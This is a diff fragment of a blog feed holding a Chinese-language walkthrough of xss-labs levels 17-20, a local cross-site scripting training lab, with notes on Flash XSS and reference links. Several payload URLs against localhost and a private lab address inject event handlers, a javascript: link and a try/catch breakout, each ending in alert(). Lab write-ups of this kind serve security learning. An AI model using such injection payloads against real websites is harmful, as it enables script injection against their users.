+<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;a%0atype=<span class="token string">"text"</span>%0a<span class="token string">"alert"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3636897a078a4392a3d629c6eabb3715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>火狐不支持swf格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b402d2307f0f45baacade379e596da50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>要找个支持flash的浏览器才能正常打开<br>17-20关都能用flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br>但这里先用别的办法<br>以18关为例<br>注入点可以在arg02<br>但是你连swf都没有哪来的moouseover哪<br>所以得url连接一下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>xss<span class="token operator">-</span>labs<span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">/</span>xsf02<span class="token punctuation">.</span>swf?a<span class="token operator">=</span>?arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">%</span>20onmouseover<span class="token operator">=</span>javascript<span class="token punctuation">:</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d2caecf88dc64e4fbbfe4d6aff041882.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h1><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash反编译工具</a><br>以下是大佬的payload</p>
+<blockquote>
+<p>卑微小杨在线emo<br>flash反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持flash的浏览器真没法做</p>
+<p>18关</p>
+</blockquote>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="token string">"javascript:alert(/bmfx/)"</span>>bmfx&lt;/a> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>19关</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token selector">catch(e)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>/bmfx/<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>//%26width=998%26height=998<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+        <tag>xss-lab</tag>
       </tags>
   </entry>
   <entry>
